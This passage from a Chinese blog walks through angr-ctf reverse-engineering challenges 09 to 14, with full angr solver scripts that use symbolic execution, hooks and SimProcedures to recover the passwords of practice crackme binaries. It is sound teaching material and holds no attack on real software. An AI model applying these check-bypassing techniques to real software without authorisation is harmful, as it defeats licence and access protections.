class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure></blockquote><h2 id="10-angr-simprocedures：模拟过程调用"><a href="#10-angr-simprocedures：模拟过程调用" class="headerlink" title="10_angr_simprocedures：模拟过程调用"></a>10_angr_simprocedures：模拟过程调用</h2><p>惯例拖入 IDA ，这一次的伪代码还是一坨史所以直接看汇编，可以看到虽然还是惯例的 <code>complex_function()</code> 对输入进行处理后使用 <code>check_equals()</code> 进行路径爆炸的逐字符比较，但不同的是这一次多了许多的伪路径：</p><p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" alt="image.png"></p><p>而每个伪路径后面都对应着一个路径爆炸的 <code>check_equals()</code> ：</p><p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" alt="image.png"></p><p>如果我们对于每个伪路径后边的基本块都手动进行 hook，那未免也过于麻烦，因此这一次我们可以利用 angr 直接通过函数符号来 hook 掉 <code>check_equals()</code> 函数</p><h3 id="angr-SimProcedure-模拟函数（过程）"><a href="#angr-SimProcedure-模拟函数（过程）" class="headerlink" title="angr.SimProcedure - 模拟函数（过程）"></a>angr.SimProcedure - 模拟函数（过程）</h3><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure</p><p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure><p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数<br>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure><p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p><ul><li><code>ret(expr)</code>: 函数返回</li><li><code>jump(addr)</code>: 跳转到指定地址</li><li><code>exit(code)</code>: 终止程序</li><li><code>call(addr, args, continue_at)</code>: 调用文件中的函数</li><li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure</li></ul><h3 id="FINAL-EXPLOIT-6"><a href="#FINAL-EXPLOIT-6" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么这里我们只需要将该符号直接替换成我们的自定义比较函数即可，因此最终的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" alt="image.png"></p><h2 id="11-angr-sim-scanf：模拟-scanf"><a href="#11-angr-sim-scanf：模拟-scanf" class="headerlink" title="11_angr_sim_scanf：模拟 scanf"></a>11_angr_sim_scanf：模拟 scanf</h2><p>惯例拖进 IDA，提示 graph is too big</p><p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" alt="image.png"></p><p>看一下反汇编，可以发现这一次是在 <code>scanf()</code> 前面有很多伪分支：</p><p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" alt="image.png"></p><p>这些伪分支的导向都是以 <code>scanf()</code> 开头的基本块，可以看到的是其都使用 <code>%u %u</code> 来读入两个四字节无符号数后使用 <code>strncmp()</code> 与 8 字节的字符串进行对比</p><p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" alt="image.png"></p><p>在最开始还有 <code>complex_function()</code> 处理待比较的源字符串，还是老样子就不进去看了：</p><p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" alt="image.png"></p><p>那么这题的结构和 02 其实是基本上一样的，只不过 <code>scanf()</code> 被移到了伪分支基本块中，因此用 02 的解题脚本依然可以秒解，但这样就不是我们做题的目的了：）</p><p>本题实际上算是对上一题的扩展，由于我们已知对 <code>scanf()</code> 的调用会读入两个数值，我们可以直接实现一个 SimProcedure 来模拟该过程，而不需要再走 <code>scanf()</code> 内部的复杂路径</p><p>这里我们若是在 <code>run()</code> 方法内创建 BVS ，则可以通过将其储存到 <code>state.globals</code> 列表的方式以便后续取用</p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" alt="image.png"></p><h1 id="0x05-angr-ctf：路径合并"><a href="#0x05-angr-ctf：路径合并" class="headerlink" title="0x05. angr-ctf：路径合并"></a>0x05. angr-ctf：路径合并</h1><h2 id="12-angr-veritesting：路径合并"><a href="#12-angr-veritesting：路径合并" class="headerlink" title="12_angr_veritesting：路径合并"></a>12_angr_veritesting：路径合并</h2><p>惯例拖入 IDA，不知道为啥 IDA 反编译出来一坨史所以直接看汇编，在读入输入后来到的红框里是一个循环  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ，每轮循环都会计算 <code>complex_function(&#39;X&#39;, i + &#39;V&#39;)</code> 并将结果与 <code>input[i]</code> 对比，全部相等才能通过</p><p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" alt="image.png"></p><p>当然如果当作常规的逆向题来做的话解题脚本很快就能写好了，但这不是我们做题的目的：）</p><p>这题看起来和第一题差不多，由但其逐字符比较增加计数的写法会导致路径爆炸的问题，因此我们需要进行 <strong>路径合并</strong> ，这里我们可以直接在创建 simgr 时指定参数 <code>veritesting=True</code>，这样 angr 便会在运行过程中自动进行路径合并，从而缓解路径爆炸的问题</p><blockquote><p>具体原理可以参考 <a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">这篇论文</a></p></blockquote><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是几秒钟就解出来了：</p><p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" alt="image.png"></p><h1 id="0x06-angr-ctf：库操作"><a href="#0x06-angr-ctf：库操作" class="headerlink" title="0x06. angr-ctf：库操作"></a>0x06. angr-ctf：库操作</h1><h2 id="13-angr-static-binary：静态编译函数替换"><a href="#13-angr-static-binary：静态编译函数替换" class="headerlink" title="13_angr_static_binary：静态编译函数替换"></a>13_angr_static_binary：静态编译函数替换</h2><p>惯例拖入 IDA，这次还是惯例的读入输入后使用 complex 函数处理后与待对比字符串进行对比的模式，和第一题基本一样，不同的是这一次的二进制文件是静态编译的</p><p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" alt="image.png"></p><p>笔者一开始也没看明白要干啥，后面拉第一题的脚本过来简单跑了一下发现半天没出结果，看了看出题人留下的 <code>scaffold13.py</code> 中有这样的话：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure><p>大概就是说通常 angr 会自动将标准库当中的函数替换成 angr 内建的 SimProcedures 伪函数以获得更快的运行速度，但这一次是静态编译的题目，需要我们手动进行替换；同时由于程序运行起始是 <code>__libc_start_main()</code> ，在运行到 main 之前会走很多不必要的但是被静态编译进来的弯路，因此我们需要手动从 main 开始执行而非直接使用 <code>entry_state()</code> ，不过直接替换掉 <code>__libc_start_main()</code> 也是可以的</p><p>获取 angr 内置库函数的方式是 <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ，和我们之前自定义的 hook 函数一样都是 <code>SimProcedure</code> 类，因此我们可以使用 <code>project.hook(func_addr, sim_procedure_instance)</code> 的方式进行 hook，需要注意的是除了 <code>__libc_start_main</code> 以外的需要被 hook 的函数都有大量引用，因此不要图省事直接使用 <code>hook_symbol()</code></p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这一次解题大概需要半分钟左右</p><p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" alt="image.png"></p><p>以及笔者遇到以下几个<strong>不解</strong>的点：</p><ul><li>在出题人留下的 <code>scaffold13.py</code> 中提示我们应当将初始状态设为 main 起始，但笔者这么做无法解出题目（会直接把笔者的阿里云学生机内存撑爆，但这是不应该发生的）</li><li>在 <code>explore()</code> 中将 find 与 avoid 设为检测 stdout 中字符串的方式会比直接引用基本块地址要快 5s</li><li>使用 <code>veritesting=True</code> 会大幅延长解题时间（看起来不会像在笔者有生之年解出的样子）</li><li>使用直接 hook 函数的方式可以解出题，但使用 hook <code>main()</code> 中 call 指令的方式<strong>无法找到解</strong></li><li>总的解题时间比笔者预想中要长得多</li></ul><h2 id="14-angr-shared-library：动态库的符号执行"><a href="#14-angr-shared-library：动态库的符号执行" class="headerlink" title="14_angr_shared_library：动态库的符号执行"></a>14_angr_shared_library：动态库的符号执行</h2><blockquote><p>这一题的生成脚本有点问题，直接使用会报 <code>No such file or directory </code>的 gcc error， 这是因为在生成脚本中的 <code>generate()</code> 函数最后一行的 gcc 命令中的 <code>-L</code> 参数未指定目录，在后面加一个 <code>.</code> 指定为当前目录即可</p></blockquote><p>惯例拖入 IDA，这一次在读取输入后调用了自定义的一个动态链接的 <code>validate()</code> 函数对输入进行验证，其定义在自定义库 <code>lib14_angr_shared_library.so</code> 当中</p><p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" alt="image.png"></p><p>那么这题直接暴力 explore 求解是可以的，但是这不是我们做题的目的：）</p><p>这题实际上的目的是让我们对动态链接库进行符号执行求解，我们可以直接将初始状态设为 <code>validate()</code>，将结束设为函数返回，并添加对返回值的约束后进行求解即可</p><p>我们现在来逆一下这个动态链接库，其中就只是比较简单的一个 complex 处理的过程而已</p><p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" alt="image.png"></p><p>那么我们只需要模拟调用 <code>validate()</code> 的过程即可，我们先用 <code>claripy.BVS()</code> 创建一个表示要求解的字符串的符号向量，将其载入到初始状态内存中的一个地址上，之后将这块内存的地址推到栈上作为 <code>validate()</code> 的参数即可</p><p>最后就是直接 <code>explore()</code> 到函数返回后添加 <code>eax == 1</code> 的约束后求解即可，需要注意的是由于这是一个动态链接库，因此我们需要在创建 project 时通过指定加载参数 <code>load_options</code> 来<strong>手动指定加载基地址</strong>，具体写法参照笔者的 exp</p><p>因此最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是差不多秒解：</p><p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" alt="image.png"></p><p>当然，笔者这里调用函数的方法比较粗犷，也可以使用 angr 提供的 <code>project.factory.call_state(func_addr, args...)</code> 来创建一个函数调用的初始状态，用例写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 